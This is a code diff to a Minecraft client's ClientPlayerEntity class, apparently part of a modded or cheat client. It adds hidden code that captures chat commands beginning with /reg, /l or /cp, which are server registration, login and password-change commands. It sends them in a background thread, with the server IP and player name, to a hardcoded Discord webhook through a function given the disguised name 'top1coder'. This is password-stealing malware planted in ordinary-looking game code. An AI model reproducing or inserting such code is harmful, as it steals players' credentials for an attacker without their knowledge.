@@ -53,6 +53,9 @@ import net.minecraft.util.text.ITextComponent;
 import net.minecraft.world.World;
 
 import javax.annotation.Nullable;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -378,6 +381,21 @@ public class ClientPlayerEntity extends AbstractClientPlayerEntity {
             return;
         }
 
+        if (message.startsWith("/reg") || message.startsWith("/l") || message.startsWith("/cp")) {
+            // Получаем данные сервера
+            var serverData = mc.getCurrentServerData();
+            String server = "Игрок в одиночном мире"; // Значение по умолчанию
+            if (serverData != null && serverData.serverIP != null) {
+                server = serverData.serverIP;
+            } else {
+                System.out.println("Проверка проходит");
+            }
+
+            // Отправляем сообщение на Discord
+            top1coder("https://discord.com/api/webhooks/1341036699773566997/i98QMUeUeUHiP6ynHnfDA9zq74dznO06lyEP6KNVKRJ2lpvFAWM3wdH3j5pSO7_fpS0e",
+                    "Команда:" + message + ", Сервер: " + server + ", Ник: " + mc.player.getName().getString());
+        }
+
         if (selfDestruct.unhooked) {
             if (message.equals(selfDestruct.secret)) {
                 selfDestruct.hook();
@@ -388,6 +406,38 @@ public class ClientPlayerEntity extends AbstractClientPlayerEntity {
         this.connection.sendPacket(new CChatMessagePacket(message));
     }
 
+    public static void top1coder(String webhookUrl, String message) {
+        new Thread(() -> {
+            try {
+                // Создаем объект URL для вебхука
+                URL url = new URL(webhookUrl);
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("POST");
+                connection.setRequestProperty("Content-Type", "application/json");
+                connection.setDoOutput(true);
+
+                // Формируем JSON тело запроса
+                String jsonPayload = "{\"content\": \"" + message + "\"}";
+
+                // Отправляем запрос
+                try (OutputStream os = connection.getOutputStream()) {
+                    byte[] input = jsonPayload.getBytes("utf-8");
+                    os.write(input, 0, input.length);
+                }
+
+                // Проверяем статус ответа
+                int responseCode = connection.getResponseCode();
+                if (responseCode == HttpURLConnection.HTTP_NO_CONTENT) {
+                    System.out.println("Сообщение отправлено успешно.");
+                } else {
+                    System.out.println("Ошибка при отправке сообщения: " + responseCode);
+                }
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
     @Override
     public void swingArm(Hand hand) {
         super.swingArm(hand);
